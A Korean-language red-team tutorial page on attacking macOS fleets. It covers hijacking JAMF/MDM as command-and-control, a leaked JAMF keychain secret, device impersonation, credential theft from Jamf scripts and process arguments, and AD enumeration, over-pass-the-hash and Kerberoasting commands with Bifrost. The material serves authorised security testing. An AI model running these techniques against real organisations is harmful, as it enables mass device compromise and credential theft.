# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}

## MDM 악용

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

관리 플랫폼에 접근하기 위해 **관리자 자격 증명을 타협**하는 데 성공하면, 기계에 악성 코드를 배포하여 **모든 컴퓨터를 타협할 수 있습니다**.

MacOS 환경에서 레드 팀 활동을 하려면 MDM이 어떻게 작동하는지에 대한 이해가 필요합니다:

{{#ref}}
macos-mdm/
{{#endref}}

### C2로서 MDM 사용

MDM은 프로필을 설치, 쿼리 또는 제거하고, 애플리케이션을 설치하고, 로컬 관리자 계정을 생성하고, 펌웨어 비밀번호를 설정하고, FileVault 키를 변경할 수 있는 권한을 가집니다...

자신의 MDM을 운영하려면 **공급업체에 의해 서명된 CSR**이 필요하며, 이를 [**https://mdmcert.download/**](https://mdmcert.download/)에서 얻으려고 시도할 수 있습니다. Apple 장치용 MDM을 운영하려면 [**MicroMDM**](https://github.com/micromdm/micromdm)을 사용할 수 있습니다.

그러나 등록된 장치에 애플리케이션을 설치하려면 여전히 개발자 계정으로 서명되어야 합니다... 하지만 MDM 등록 시 **장치가 MDM의 SSL 인증서를 신뢰할 수 있는 CA로 추가**하므로 이제 무엇이든 서명할 수 있습니다.

장치를 MDM에 등록하려면 **`mobileconfig`** 파일을 루트로 설치해야 하며, 이는 **pkg** 파일을 통해 전달될 수 있습니다(이를 zip으로 압축하고 Safari에서 다운로드하면 압축이 해제됩니다).

**Mythic agent Orthrus**는 이 기술을 사용합니다.

### JAMF PRO 악용

JAMF는 **사용자 정의 스크립트**(시스템 관리자가 개발한 스크립트), **네이티브 페이로드**(로컬 계정 생성, EFI 비밀번호 설정, 파일/프로세스 모니터링...) 및 **MDM**(장치 구성, 장치 인증서...)를 실행할 수 있습니다.

#### JAMF 자체 등록

`https://<company-name>.jamfcloud.com/enroll/`와 같은 페이지로 가서 **자체 등록이 활성화되어 있는지** 확인하십시오. 활성화되어 있다면 **접근을 위한 자격 증명을 요청할 수 있습니다**.

스크립트 [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py)를 사용하여 비밀번호 스프레이 공격을 수행할 수 있습니다.

또한, 적절한 자격 증명을 찾은 후에는 다음 양식을 사용하여 다른 사용자 이름을 무차별 대입할 수 있습니다:

![](<../../images/image (107).png>)

#### JAMF 장치 인증

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** 바이너리는 키체인을 열기 위한 비밀을 포함하고 있으며, 발견 당시 모든 사람과 **공유**되었습니다: **`jk23ucnq91jfu9aj`**.\
또한, jamf는 **`/Library/LaunchAgents/com.jamf.management.agent.plist`**에 **LaunchDaemon**으로 **지속**됩니다.

#### JAMF 장치 인수

**JSS** (Jamf Software Server) **URL**은 **`jamf`**가 사용할 **`/Library/Preferences/com.jamfsoftware.jamf.plist`**에 위치합니다.\
이 파일은 기본적으로 URL을 포함하고 있습니다:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
그래서 공격자는 설치할 때 이 파일을 **덮어쓰는** 악성 패키지(`pkg`)를 배포할 수 있으며, 이제 **Typhon 에이전트의 Mythic C2 리스너에 대한 URL**을 설정하여 JAMF를 C2로 악용할 수 있습니다.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF 사칭

장치와 JMF 간의 **통신을 사칭**하려면 다음이 필요합니다:

- 장치의 **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- 장치 인증서를 포함하는 **JAMF 키체인**: `/Library/Application\ Support/Jamf/JAMF.keychain`

이 정보를 바탕으로 **도난당한** 하드웨어 **UUID**와 **SIP 비활성화**된 **VM**을 생성하고, **JAMF 키체인**을 드롭한 후 Jamf **에이전트**를 **후킹**하여 정보를 훔치세요.

#### 비밀 정보 훔치기

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

관리자가 Jamf를 통해 실행하고자 할 **커스텀 스크립트**를 위해 `/Library/Application Support/Jamf/tmp/` 위치를 모니터링할 수도 있습니다. 이 스크립트는 **여기에 배치되고 실행된 후 제거됩니다**. 이러한 스크립트는 **자격 증명**을 포함할 수 있습니다.

그러나 **자격 증명**은 이러한 스크립트에 **매개변수**로 전달될 수 있으므로, `ps aux | grep -i jamf`를 모니터링해야 합니다 (루트 권한 없이도 가능합니다).

스크립트 [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)는 새 파일이 추가되거나 새로운 프로세스 인수가 생기는 것을 감지할 수 있습니다.

### macOS 원격 접근

또한 **MacOS**의 "특별한" **네트워크** **프로토콜**에 대해:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

일부 경우 **MacOS 컴퓨터가 AD에 연결되어 있는** 것을 발견할 수 있습니다. 이 시나리오에서는 익숙한 대로 **활성 디렉토리**를 **열거**하려고 시도해야 합니다. 다음 페이지에서 **도움**을 찾으세요:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

도움이 될 수 있는 **로컬 MacOS 도구**는 `dscl`입니다:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
또한 MacOS에서 AD를 자동으로 열거하고 kerberos와 상호작용할 수 있도록 준비된 도구들이 있습니다:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound는 MacOS 호스트에서 Active Directory 관계를 수집하고 수집할 수 있도록 하는 Bloodhound 감사 도구의 확장입니다.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost는 macOS에서 Heimdal krb5 API와 상호작용하도록 설계된 Objective-C 프로젝트입니다. 이 프로젝트의 목표는 타겟에 다른 프레임워크나 패키지를 요구하지 않고 네이티브 API를 사용하여 macOS 장치에서 Kerberos에 대한 보안 테스트를 개선하는 것입니다.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory 열거를 수행하기 위한 JavaScript for Automation (JXA) 도구입니다.

### 도메인 정보
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### 사용자

MacOS 사용자 유형은 다음과 같습니다:

- **로컬 사용자** — 로컬 OpenDirectory 서비스에 의해 관리되며, Active Directory와는 어떤 식으로도 연결되어 있지 않습니다.
- **네트워크 사용자** — DC 서버에 연결하여 인증을 요구하는 변동성 Active Directory 사용자입니다.
- **모바일 사용자** — 자격 증명 및 파일에 대한 로컬 백업이 있는 Active Directory 사용자입니다.

사용자 및 그룹에 대한 로컬 정보는 _/var/db/dslocal/nodes/Default_ 폴더에 저장됩니다.\
예를 들어, _mark_라는 사용자에 대한 정보는 _/var/db/dslocal/nodes/Default/users/mark.plist_에 저장되며, _admin_ 그룹에 대한 정보는 _/var/db/dslocal/nodes/Default/groups/admin.plist_에 있습니다.

HasSession 및 AdminTo 엣지를 사용하는 것 외에도, **MacHound는 Bloodhound 데이터베이스에 세 가지 새로운 엣지를 추가합니다**:

- **CanSSH** - 호스트에 SSH로 접속할 수 있는 엔티티
- **CanVNC** - 호스트에 VNC로 접속할 수 있는 엔티티
- **CanAE** - 호스트에서 AppleEvent 스크립트를 실행할 수 있는 엔티티
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
더 많은 정보는 [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)에서 확인하세요.

### Computer$ 비밀번호

다음 방법으로 비밀번호를 가져옵니다:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** 비밀번호에 시스템 키체인에서 접근할 수 있습니다.

### Over-Pass-The-Hash

특정 사용자 및 서비스에 대한 TGT를 가져옵니다:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGT가 수집되면, 현재 세션에 주입할 수 있습니다:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
획득한 서비스 티켓을 사용하여 다른 컴퓨터의 공유에 접근할 수 있습니다:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## 키체인 접근

키체인은 민감한 정보를 포함하고 있을 가능성이 높으며, 프롬프트를 생성하지 않고 접근할 경우 레드 팀 연습을 진행하는 데 도움이 될 수 있습니다:

{{#ref}}
macos-keychain.md
{{#endref}}

## 외부 서비스

MacOS 레드 팀은 일반적인 Windows 레드 팀과 다르며, 보통 **MacOS는 여러 외부 플랫폼과 직접 통합되어 있습니다**. MacOS의 일반적인 구성은 **OneLogin 동기화 자격 증명을 사용하여 컴퓨터에 접근하고, OneLogin을 통해 여러 외부 서비스**(예: github, aws...)에 접근하는 것입니다.

## 기타 레드 팀 기술

### Safari

Safari에서 파일이 다운로드될 때, "안전한" 파일이라면 **자동으로 열립니다**. 예를 들어, **zip 파일을 다운로드하면** 자동으로 압축이 해제됩니다:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## 참고 문헌

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
